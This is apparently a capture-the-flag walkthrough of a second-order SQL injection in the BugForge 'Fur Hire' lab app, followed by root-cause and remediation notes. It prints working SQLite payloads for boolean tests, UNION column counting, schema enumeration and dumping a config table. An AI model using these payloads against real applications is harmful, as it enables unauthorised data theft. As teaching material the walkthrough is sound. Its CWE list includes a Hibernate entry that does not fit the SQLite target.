---
layout: post
title:  "BugForge - Weekly - Fur Hire"
date:   2026-01-31 09:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [sql-injection,sql-injection-second-order]
categories: [BugForge,weekly,fur-hire]
---

# Weekly - Fur Hire
><br/><b>Vulnerabilities Covered:</b>
<br/>
SQL Injection (Second Order)
<br/>
<br/>
<b>Summary:</b>
<br/>
This walkthrough demonstrates a second-order SQL injection vulnerability in a job recruitment application where malicious SQL payloads injected into job titles during creation are stored and later executed when the recruiter views job applications. By exploiting comma sanitization behavior as an indicator of SQL processing, boolean-based payloads were used to confirm injection, followed by UNION-based extraction using SQLite JOIN syntax to enumerate database tables and extract sensitive configuration data containing the challenge flag.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Account Creation & Role Setup

Create two user accounts with different roles to test the application's job posting and application workflow:
- One account with the **Recruiter** role (to create job postings)
- One account with the **Job Seeker** role (to apply for jobs)

This dual-account setup allows testing of the complete job application flow and identifying where data submitted by one role is processed when viewed by another.

---

### Step 2 - Analysing Input Sanitization

Log in as the **Recruiter** and create a new job posting. During testing, observe that the job title field sanitizes commas (`,`) from the input. This unusual behavior suggests the field may be processed in a SQL context.

![Job Title with Comma - Create Post](/images/bug-forge/weekly/fur-hire/sql-second-order/create-job-post-with-comma.png)

![Job Title - Sanitized Comma - UI](/images/bug-forge/weekly/fur-hire/sql-second-order/get-jobs-title-no-comma-ui.png)

![Job Title - Sanitized Comma - Request](/images/bug-forge/weekly/fur-hire/sql-second-order/get-jobs-no-comma-request.png)

The comma removal is a strong indicator that the job title may be concatenated into a SQL query, warranting further SQL injection testing.

---

### Step 3 - Boolean-Based SQL Injection Testing

Test for SQL injection by creating jobs with boolean-based payloads:

**First payload (always true):**
```sql
test' or 1=1--
```

**Second payload (always false):**
```sql
test' or 1=2--
```

After creating the job with the true condition, apply to it using the **Job Seeker** account. Then create the job with the false condition and apply to that as well.

---

### Step 4 - Confirming Second-Order Injection

Switch back to the **Recruiter** account and observe the application notifications. Notice that while applications are received (notification appears), viewing the applications for the `1=2` condition job shows **no applications listed**.

![Job Application Notification](/images/bug-forge/weekly/fur-hire/sql-second-order/application-for-sqli-ui.png)

![No Applications Displayed - UI](/images/bug-forge/weekly/fur-hire/sql-second-order/sqli-no-applications-ui.png)

![No Applications - API Response](/images/bug-forge/weekly/fur-hire/sql-second-order/sqli-no-application-request.png)

This confirms second-order SQL injection: the payload stored in the job title is executed when the recruiter queries for applications, and the false condition (`1=2`) causes no results to be returned.

---

### Step 5 - Enumerating Column Count

Standard `ORDER BY` enumeration fails with database errors. Instead, use UNION-based injection with SQLite JOIN syntax to determine the column count.

Progressively test with increasing column counts:

```sql
' UNION SELECT * FROM (SELECT 1)--
' UNION SELECT * FROM (SELECT 1) JOIN (SELECT 2)--
' UNION SELECT * FROM (SELECT 1) JOIN (SELECT 2) JOIN (SELECT 3)--
...
' UNION SELECT * FROM (SELECT 1) JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
```

At **15 columns**, the query returns a valid response instead of a database error, confirming the original SELECT statement uses 15 columns.

![Valid Response with 15 Columns](/images/bug-forge/weekly/fur-hire/sql-second-order/request-column-count.png)

---

### Step 6 - Database Table Enumeration

With the column count confirmed, extract the database schema by querying `sqlite_master`:

```sql
test' UNION SELECT * FROM (SELECT name FROM sqlite_master WHERE type='table') JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
```

![Extract Database Tables - POST](/images/bug-forge/weekly/fur-hire/sql-second-order/post-extract-database-tables.png)

![Extract Database Tables - Response](/images/bug-forge/weekly/fur-hire/sql-second-order/get-database-tables-dump.png)

The response reveals several tables including a `config` table which likely contains sensitive application configuration.

---

### Step 7 - Config Table Structure Extraction

Extract the schema of the `config` table to understand its column structure:

```sql
' UNION SELECT * FROM (SELECT sql FROM sqlite_master WHERE type='table' AND name='config') JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
```

![Extract Config Columns - POST](/images/bug-forge/weekly/fur-hire/sql-second-order/post-extract-config-columns.png)

![Extract Config Columns - Response](/images/bug-forge/weekly/fur-hire/sql-second-order/get-config-columns.png)

The table schema reveals `key` and `value` columns, indicating a key-value configuration store.

---

### Step 8 - Flag Extraction

Dump the contents of the `config` table using `GROUP_CONCAT` to combine all key-value pairs:

```sql
' UNION SELECT * FROM (SELECT GROUP_CONCAT(key || ':' || value) FROM config) JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
```

![Extract Config Data - POST](/images/bug-forge/weekly/fur-hire/sql-second-order/post-extract-config-data.png)

![Flag Retrieved](/images/bug-forge/weekly/fur-hire/sql-second-order/flag.png)

The flag is successfully extracted from the config table, completing the challenge.

---

### Impact

- Extraction of sensitive configuration data from the database
- Complete database schema enumeration enabling further attacks
- Potential access to user credentials, secrets, and application configuration
- Data breach affecting all stored application data
- Demonstrates how stored data can become attack vectors when processed unsafely

---

### Vulnerability Classification

- **OWASP Top 10:** A03:2021 - Injection
- **Vulnerability Type:** Second-Order SQL Injection (Stored SQL Injection)
- **Attack Vector:** UNION-based data extraction via stored job title field
- **Database:** SQLite
- **CWE:**
  - CWE-89 - Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
  - CWE-564 - SQL Injection: Hibernate
  - CWE-943 - Improper Neutralization of Special Elements in Data Query Logic

---

### Root Cause

The application fails to properly sanitize user input when storing job titles and subsequently uses this stored data in dynamically constructed SQL queries without parameterization. While the application attempts to filter certain characters (commas), it does not adequately prevent SQL injection payloads. The vulnerability manifests as second-order injection because the malicious payload is stored during job creation but executed later when the recruiter views applications, where the job title is concatenated into a query to retrieve application data.

---

### Remediation

- Use parameterized queries or prepared statements for all database operations, including those using stored data
- Implement comprehensive input validation and output encoding at both storage and retrieval points
- Apply the principle of least privilege to database accounts
- Treat all stored user data as untrusted when used in subsequent queries
- Implement Web Application Firewall (WAF) rules as defense in depth
- Conduct regular security code reviews focusing on data flow from storage to query execution
- Consider using an ORM with proper parameterization to reduce direct SQL construction

---